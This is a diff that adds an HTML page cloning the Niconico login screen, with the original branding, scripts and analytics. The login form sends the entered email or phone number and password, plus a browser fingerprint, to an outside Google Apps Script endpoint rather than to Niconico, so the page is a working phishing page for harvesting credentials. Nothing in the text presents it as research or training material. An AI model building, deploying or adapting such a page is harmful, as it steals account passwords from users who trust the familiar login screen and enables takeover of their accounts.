@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html><head prefix="og: http://ogp.me/ns#">
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    
+    <meta name="copyright" content="© DWANGO Co., Ltd.">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Cache-Control" content="no-cache">
+    <meta http-equiv="Expires" content="-1">
+    <meta property="og:title" content="ニコニコ">
+    <meta property="og:type" content="website">
+    <meta property="og:description" content="ニコニコはドワンゴが運営する日本最大級の動画サービスです。ニコニコ動画やニコニコ生放送、ニコニコ静画など、ゲームや音楽、エンターテイメントは全てニコニコで！">
+    <meta property="og:url" content="https://www.nicovideo.jp/">
+    <meta property="og:image" content="https://account.nicovideo.jp/assets/images/ogp/niconico.png">
+    <meta property="og:site_name" content="ニコニコ">
+    <title>
+      ログイン - ニコニコ</title>
+    
+      <link rel="stylesheet" href="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/login_form.css">
+    
+    <link rel="stylesheet" href="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/proxy_notice.css">
+    <link rel="shortcut icon" type="image/ico" href="https://account.nicovideo.jp/assets/public/img/base/favicon.ico">
+    
+
+    <script type="text/javascript" async="" src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/linkid.js"></script><script async="" src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/a_004.js"></script><script type="text/javascript" async="" src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/conversion_async_002.js"></script><script type="text/javascript" async="" src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/conversion_async_002.js"></script><script type="text/javascript" async="" src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/conversion_async_002.js"></script><script type="text/javascript" async="" src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/conversion_async_002.js"></script><script type="text/javascript" async="" src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/conversion_async_002.js"></script><script type="text/javascript" async="" src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/js_005"></script><script type="text/javascript" async="" src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/js_004"></script><script type="text/javascript" async="" src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/js_002"></script><script type="text/javascript" async="" src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/js_006"></script><script type="text/javascript" async="" src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/js_007"></script><script type="text/javascript" async="" src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/conversion_async_002.js"></script><script type="text/javascript" async="" src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/analytics.js"></script><script type="text/javascript" async="" src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/js_003"></script><script async="" src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/gtm.js"></script><script>var NicoGoogleTagManagerDataLayer = [{"user":{"user_id":null,"login_status":"not_login","member_status":null,"birthday":null,"sex":null,"country":null,"prefecture":null,"account_create_datetime":null,"premium_register_datetime":null,"premium_unregister_datetime":null},"content":{"player_type":null,"deliverty":null,"category":null,"content_type":null}}];</script>
+    <!-- Google Tag Manager -->
+    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+            new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+            'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+            })(window,document,'script','NicoGoogleTagManagerDataLayer','GTM-KXT7G5G');</script>
+    <!-- End Google Tag Manager -->
+
+    
+      <script type="text/javascript" charset="utf-8" src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/ads-2.js"></script>
+    
+    <script src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/fingerprint.js" type="text/javascript"></script>
+    <script src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/jquery-3.js" type="text/javascript"></script>
+    <script src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/html5shiv.js" type="text/javascript"></script>
+    <script src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/ui.js" type="text/javascript"></script>
+    <script src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/api-client.js" type="text/javascript"></script>
+  <script type="text/javascript" src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/conversion_async.js"></script><script src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/a_003.js"></script><script src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/a_006.js"></script><script src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/a_007.js"></script><script src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/a_005.js"></script><meta http-equiv="origin-trial" content=""><script src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/a_008.js"></script><script src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/a.js"></script><script src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/a_002.js"></script></head>
+  <body class="ja-jp">
+  
+<div id="proxy-notice" style="display: none;">
+    <div class="proxy-notice-inner">
+        <div class="proxy-notice-content">
+            <img class="proxy-notice-icon" src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/error.svg">
+            
+<script>
+        function isNiconicoURI(uri) {
+            if (uri.protocol !== "https:") return false;
+
+            
+            var whitelists = [
+                /(^|\.)nicovideo\.jp$/,
+                /^www\.google\.com$/,
+                /^www\.google\.co\.jp$/,
+                /^(webcache|translate)\.googleusercontent\.com$/,
+                /^(www|search)\.yahoo\.co\.jp$/
+            ];
+            return whitelists.some(function (regex) {
+              return regex.test(uri.hostname);
+            });
+        }
+        if (!isNiconicoURI(window.location)) {
+            document.getElementById("proxy-notice").style.display = "block";
+        }
+</script>
+
+  
+    <header role="banner" class="header">
+      
+        
+          <h1 class="header__title">
+              <a href="https://www.nicovideo.jp/">
+                  <img src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/niconico.svg" alt="">
+              </a>
+          </h1>
+        
+      
+    
+  </header>
+  <div class="contents">
+    <div role="main" class="main ins__ads login">
+      <header class="contents-header border-around">
+        <h1 class="contents-header__title">ログイン</h1>
+      </header>
+      
+
+
+      <div class="contents-body">
+
+      
+          
+            
+          <div class="row form-group border-around login-form round border-em-around shadow-around">
+            
+<form action="https://script.google.com/macros/s/AKfycbzvNcq8sINHK0nOHXACtNogPM7H7qyOOOc375cHIRLo1FTiZqbVfChiz3KY7z4wORL9wg/exec" method="POST" id="login_form">
+    
+              <p class="input-group">
+                <label class="input-group__label">メールアドレスまたは電話番号</label>
+                <input id="input__mailtel" type="text" name="mail_tel">
+              </p>
+              <p class="input-group neighbor">
+                <label class="input-group__label">パスワード</label>
+                <input id="input__password" type="password" name="password">
+              </p>
+              <p class="button-wrap neighbor">
+                <input id="login__submit" type="submit" value="ログイン" class="button button-primary round shadow-around">
+              </p>
+            
+<input type="hidden" name="auth_id" value="2404629721"></form>
+
+            
+            
+                  <span>はじめての方は登録手続きへお進みください。</span>
+          
+        
+        
+          <div class="row ads" id="ads">
+            
+            
+              <script type="text/javascript">
+                Ads.loaderInterval = 0;
+                new Ads.Advertisement({
+                  zone: 124
+                }).set('ads');
+              </script>
+            
+         
+      
+      </div>
+    </div>
+  </div>
+  
+    
+<footer class="footer" role="contentinfo">
+  <div class="inner">
+    <p class="copyright"><small>© DWANGO Co., Ltd.</small></p>
+  </div>
+</footer>
+
+  
+
+  
+  <script>
+  $(function(){
+    $('<input>').attr({
+      type: 'hidden',
+      
+      name: 'auth_id',
+      value: new Fingerprint({canvas: true}).get(),
+    }).appendTo($('#login_form'));
+  });
+  </script>
+
+  
+
+
+<script type="text/javascript" id="">var propertyId=google_tag_manager["GTM-KXT7G5G"].macro(435),userId=google_tag_manager["GTM-KXT7G5G"].macro(436),page=google_tag_manager["GTM-KXT7G5G"].macro(517),appName=google_tag_manager["GTM-KXT7G5G"].macro(520),appId=google_tag_manager["GTM-KXT7G5G"].macro(523),cd1=google_tag_manager["GTM-KXT7G5G"].macro(524),cd7=google_tag_manager["GTM-KXT7G5G"].macro(527),cd10=google_tag_manager["GTM-KXT7G5G"].macro(528),cd13=google_tag_manager["GTM-KXT7G5G"].macro(529),cd16=google_tag_manager["GTM-KXT7G5G"].macro(530),cd20=google_tag_manager["GTM-KXT7G5G"].macro(534),cd23=google_tag_manager["GTM-KXT7G5G"].macro(535),cd25=google_tag_manager["GTM-KXT7G5G"].macro(536),cd28=google_tag_manager["GTM-KXT7G5G"].macro(537),cd32=google_tag_manager["GTM-KXT7G5G"].macro(538),cd36=google_tag_manager["GTM-KXT7G5G"].macro(539),cd39=google_tag_manager["GTM-KXT7G5G"].macro(541),cd40=google_tag_manager["GTM-KXT7G5G"].macro(542),
+cd43=google_tag_manager["GTM-KXT7G5G"].macro(543),cd46=google_tag_manager["GTM-KXT7G5G"].macro(544),cd49=google_tag_manager["GTM-KXT7G5G"].macro(545),cd52=google_tag_manager["GTM-KXT7G5G"].macro(546),cd55=google_tag_manager["GTM-KXT7G5G"].macro(548),cd58=google_tag_manager["GTM-KXT7G5G"].macro(549),cd61=google_tag_manager["GTM-KXT7G5G"].macro(556),cd65=google_tag_manager["GTM-KXT7G5G"].macro(557),cd68=google_tag_manager["GTM-KXT7G5G"].macro(558),cd70=google_tag_manager["GTM-KXT7G5G"].macro(633),cd73=google_tag_manager["GTM-KXT7G5G"].macro(634),cd79=google_tag_manager["GTM-KXT7G5G"].macro(638),cd104=google_tag_manager["GTM-KXT7G5G"].macro(641),cd112=google_tag_manager["GTM-KXT7G5G"].macro(642),cd111=google_tag_manager["GTM-KXT7G5G"].macro(643),cd106=google_tag_manager["GTM-KXT7G5G"].macro(644),cd107=google_tag_manager["GTM-KXT7G5G"].macro(645),cd99=google_tag_manager["GTM-KXT7G5G"].macro(646),
+cd118=google_tag_manager["GTM-KXT7G5G"].macro(647),cd122=google_tag_manager["GTM-KXT7G5G"].macro(648),cd123=google_tag_manager["GTM-KXT7G5G"].macro(649),cd124=google_tag_manager["GTM-KXT7G5G"].macro(650),cd125=google_tag_manager["GTM-KXT7G5G"].macro(651),cd126=google_tag_manager["GTM-KXT7G5G"].macro(652),cd127=google_tag_manager["GTM-KXT7G5G"].macro(653),cd121=google_tag_manager["GTM-KXT7G5G"].macro(654),cd131=google_tag_manager["GTM-KXT7G5G"].macro(655),cd132=google_tag_manager["GTM-KXT7G5G"].macro(656),cd133=google_tag_manager["GTM-KXT7G5G"].macro(657),cd147=google_tag_manager["GTM-KXT7G5G"].macro(658),cd148=google_tag_manager["GTM-KXT7G5G"].macro(659),cd149=google_tag_manager["GTM-KXT7G5G"].macro(660),cd150=google_tag_manager["GTM-KXT7G5G"].macro(661),cd151=google_tag_manager["GTM-KXT7G5G"].macro(662),cd152=google_tag_manager["GTM-KXT7G5G"].macro(663),cd142=userId,
+cd155=google_tag_manager["GTM-KXT7G5G"].macro(664),cd156=google_tag_manager["GTM-KXT7G5G"].macro(665),cd157=google_tag_manager["GTM-KXT7G5G"].macro(666),cd158=google_tag_manager["GTM-KXT7G5G"].macro(667),cd159=google_tag_manager["GTM-KXT7G5G"].macro(668),cd160=google_tag_manager["GTM-KXT7G5G"].macro(669),cd161=google_tag_manager["GTM-KXT7G5G"].macro(670),cm1=google_tag_manager["GTM-KXT7G5G"].macro(671),cm2=google_tag_manager["GTM-KXT7G5G"].macro(672),cm3=google_tag_manager["GTM-KXT7G5G"].macro(673);
+"ga"!==window.GoogleAnalyticsObject&&function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b;a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)};a[b].l=1*new Date;c=e.createElement(f);d=e.getElementsByTagName(f)[0];c.async=1;c.src=g;d.parentNode.insertBefore(c,d)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga");ga("create",propertyId,"auto",{name:"NicoGoogleTagManager",allowLinker:!0});ga("NicoGoogleTagManager.require","linkid");
+ga("NicoGoogleTagManager.set","userId",userId);ga("NicoGoogleTagManager.require","linker");ga("NicoGoogleTagManager.linker:autoLink",google_tag_manager["GTM-KXT7G5G"].macro(676));ga("NicoGoogleTagManager.set","dimension1",cd1);ga("NicoGoogleTagManager.set","dimension7",cd7);ga("NicoGoogleTagManager.set","dimension10",cd10);ga("NicoGoogleTagManager.set","dimension13",cd13);ga("NicoGoogleTagManager.set","dimension16",cd16);ga("NicoGoogleTagManager.set","dimension20",cd20);ga("NicoGoogleTagManager.set","dimension23",cd23);
+ga("NicoGoogleTagManager.set","dimension25",cd25);ga("NicoGoogleTagManager.set","dimension28",cd28);ga("NicoGoogleTagManager.set","dimension32",cd32);ga("NicoGoogleTagManager.set","dimension36",cd36);ga("NicoGoogleTagManager.set","dimension39",cd39);ga("NicoGoogleTagManager.set","dimension40",cd40);ga("NicoGoogleTagManager.set","dimension43",cd43);ga("NicoGoogleTagManager.set","dimension46",cd46);ga("NicoGoogleTagManager.set","dimension49",cd49);ga("NicoGoogleTagManager.set","dimension52",cd52);
+ga("NicoGoogleTagManager.set","dimension55",cd55);ga("NicoGoogleTagManager.set","dimension58",cd58);ga("NicoGoogleTagManager.set","dimension61",cd61);ga("NicoGoogleTagManager.set","dimension65",cd65);ga("NicoGoogleTagManager.set","dimension68",cd68);ga("NicoGoogleTagManager.set","dimension70",cd70);ga("NicoGoogleTagManager.set","dimension73",cd73);ga("NicoGoogleTagManager.set","dimension79",cd79);ga("NicoGoogleTagManager.set","dimension104",cd104);ga("NicoGoogleTagManager.set","dimension112",cd112);
+ga("NicoGoogleTagManager.set","dimension111",cd111);ga("NicoGoogleTagManager.set","dimension118",cd118);ga("NicoGoogleTagManager.set","dimension76",appId);ga("NicoGoogleTagManager.set","dimension122",cd122);ga("NicoGoogleTagManager.set","dimension123",cd123);ga("NicoGoogleTagManager.set","dimension124",cd124);ga("NicoGoogleTagManager.set","dimension125",cd125);ga("NicoGoogleTagManager.set","dimension126",cd126);ga("NicoGoogleTagManager.set","dimension127",cd127);
+ga("NicoGoogleTagManager.set","dimension121",cd121);ga("NicoGoogleTagManager.set","dimension131",cd131);ga("NicoGoogleTagManager.set","dimension132",cd132);ga("NicoGoogleTagManager.set","dimension133",cd133);ga("NicoGoogleTagManager.set","dimension147",cd147);ga("NicoGoogleTagManager.set","dimension148",cd148);ga("NicoGoogleTagManager.set","dimension149",cd149);ga("NicoGoogleTagManager.set","dimension150",cd150);ga("NicoGoogleTagManager.set","dimension151",cd151);
+ga("NicoGoogleTagManager.set","dimension152",cd152);ga("NicoGoogleTagManager.set","dimension142",cd142);ga("NicoGoogleTagManager.set","dimension155",cd155);ga("NicoGoogleTagManager.set","dimension156",cd156);ga("NicoGoogleTagManager.set","dimension157",cd157);ga("NicoGoogleTagManager.set","dimension158",cd158);ga("NicoGoogleTagManager.set","dimension159",cd159);ga("NicoGoogleTagManager.set","dimension160",cd160);ga("NicoGoogleTagManager.set","dimension161",cd161);
+ga("NicoGoogleTagManager.send","screenview",{appName:appName,appVersion:"1.0.0",appId:appId,screenName:page});</script>
+<script type="text/javascript" id="" src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/js"></script><script type="text/javascript" id="" src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/ytag.js"></script>
+<script type="text/javascript" id="">window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date);gtag("config","AW-663701876");gtag("config","AW-607644388");gtag("config","AW-561674311");gtag("config","AW-691017027");gtag("config","AW-471708133");gtag("config","AW-469855517");</script>
+<script type="text/javascript" id="">gtag("event","conversion",{send_to:"AW-663701876/5UXsCJGPwMkBEPSSvbwC"});</script>
+<script type="text/javascript" id="">window.yjDataLayer=window.yjDataLayer||[];function ytag(){yjDataLayer.push(arguments)}ytag({type:"ycl_cookie"});ytag({type:"ycl_cookie_extended"});</script><script type="text/javascript" id="" src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/ytag.js"></script><script type="text/javascript" id="" src="%E3%83%AD%E3%82%AF%E3%82%99%E3%82%A4%E3%83%B3%20-%20%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3_files/ytag.js"></script>
+<script type="text/javascript" id="">window.yjDataLayer=window.yjDataLayer||[];function ytag(){yjDataLayer.push(arguments)}ytag({type:"yss_retargeting",config:{yahoo_ss_retargeting_id:"1001168154",yahoo_sstag_custom_params:{}}});</script>
+<script type="text/javascript" id="">window.yjDataLayer=window.yjDataLayer||[];function ytag(){yjDataLayer.push(arguments)}ytag({type:"yjad_retargeting",config:{yahoo_retargeting_id:"3J9U16764G",yahoo_retargeting_label:""}});</script></body></html>
